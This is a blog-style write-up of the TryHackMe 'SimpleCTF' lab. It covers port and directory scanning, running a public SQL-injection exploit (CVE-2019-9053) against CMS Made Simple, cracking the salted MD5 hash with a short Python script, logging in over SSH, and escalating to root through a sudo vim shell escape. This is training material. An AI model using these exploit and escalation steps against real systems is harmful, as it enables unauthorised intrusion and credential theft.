---
layout: page
title: SimpleCTF
description: Exploited CMS via public vulnerability
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/simplectf/logo.png" title="THM SimpleCTF Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/easyctf">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Wanted to pop an easy one just to get the rush.

Let's give it an nmap scan to find the ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.64.46
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 11:21 AEDT
Nmap scan report for 10.10.64.46
Host is up (0.26s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.119.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

<snip>
```
{% endraw %}

<br />
Check the robots.txt file.  Check to see if there is anything interesting.

{% raw %}
```html
http://10.10.4.247/robots.txt

#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```
{% endraw %}

<br />
FFUF the webserver to try and find directories and web servers.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/simple]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.4.247/FUZZ -e .txt,.bak,.html -fw 3503

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.4.247/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3503
________________________________________________

.html                   [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 278ms]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 267ms]
simple                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 262ms]
```
{% endraw %}

<br />
Check the /simple directory that is running on the webserver.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/simplectf/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Research CMS Made Simple, version 2.2.8, to see if there are any available vulnerabilities that exist.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/simplectf/google.png" title="Research" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the exploit from exploit-db.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/simple]
└─$ wget https://www.exploit-db.com/raw/46635 -O exploit.py  
--2025-03-02 15:38:28--  https://www.exploit-db.com/raw/46635
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6456 (6.3K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   6.30K  --.-KB/s    in 0s      

2025-03-02 15:38:29 (97.8 MB/s) - ‘exploit.py’ saved [6456/6456]
```
{% endraw %}

<br />
Update the code to remove the termcolor from the code so I don't have to install it.

{% raw %}
```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
import time
import optparse
import hashlib

<snip>

def beautify_print_try(value):
    global output
    print "\033c"
    print('[*] Try: ' + value)

def beautify_print():
    global output
    print "\033c"
    print(output)

<snip>

if options.cracking:
    print("[*] Now try to crack password")
    crack_password()

beautify_print()
```
{% endraw %}

<br />
Run the exploit and redirect the output to a file so it is easier to read.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/simple]
└─$ python2 exploit.py -u http://10.10.4.247/simple > output.txt
```
{% endraw %}

<br />
View the results from the file.

{% raw %}
```bash
<snip>

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
{% endraw %}

<br />
I was having issues with the password cracker in the original exploit so I wrote my own using the original as a guide.

{% raw %}
```python
import hashlib

salt = '1dac0d92e9fa6bb2'
hashey = '0c01f4468bd75d7a84c7eb73846e8d96'

with open('/usr/share/wordlists/rockyou.txt','r') as fs:
    for line in fs:
        passwd = line.rstrip('\n')
        if hashlib.md5(str(salt).encode('utf-8') + passwd.encode('utf-8')).hexdigest() == hashey:
            print('[*] Password cracked: {passwd}'.format(passwd=passwd))
            break

print('Fin')
```
{% endraw %}

<br />
Run it to crack the password.

{% raw %}
```python
========== RESTART: /home/kali/Documents/thm/simple/thm-crack_0x00.py ==========
[*] Password cracked: secret
Fin
```
{% endraw %}

<br />
SSH with the credentials from the script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/simple]
└─$ ssh mitch@10.10.4.247 -p 2222
The authenticity of host '[10.10.4.247]:2222 ([10.10.4.247]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.4.247]:2222' (ED25519) to the list of known hosts.
mitch@10.10.4.247's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$
```
{% endraw %}

<br />
Check the home directory to see the users with a home directory.

{% raw %}
```bash
$ ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
$ cat user.txt  
<redacted>
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:f7:43:b2:36:55 brd ff:ff:ff:ff:ff:ff
    inet 10.10.4.247/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::f7:43ff:feb2:3655/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run sudo -l to see the commands that the user can run as sudo.

{% raw %}
```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
{% endraw %}

<br />
Run sudo vim to enter into vim.

{% raw %}
```bash
$ sudo /usr/bin/vim
```
{% endraw %}

<br />
Use vim to drop into a shell.

{% raw %}
```bash
<snip>

~                                                                                                            VIM - Vi IMproved                                                                                                              
~                                                                                                                                                                                                                                           
~                                                                                                             version 7.4.1689                                                                                                              
~                                                                                                         by Bram Moolenaar et al.                                                                                                          
~                                                                                         Modified by pkg-vim-maintainers@lists.alioth.debian.org                                                                                           
~                                                                                               Vim is open source and freely distributable                                                                                                 
~                                                                                                                                                                                                                                           
~                                                                                                      Become a registered Vim user!                                                                                                        
~                                                                                              type  :help register<Enter>   for information                                                                                                
~                                                                                                                                                                                                                                           
~                                                                                              type  :q<Enter>               to exit                                                                                                        
~                                                                                              type  :help<Enter>  or  <F1>  for on-line help                                                                                               
~                                                                                              type  :help version7<Enter>   for version info 

<snip>

:!sh
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:f7:43:b2:36:55 brd ff:ff:ff:ff:ff:ff
    inet 10.10.4.247/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::f7:43ff:feb2:3655/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that we wrapped this one up.  See you next time!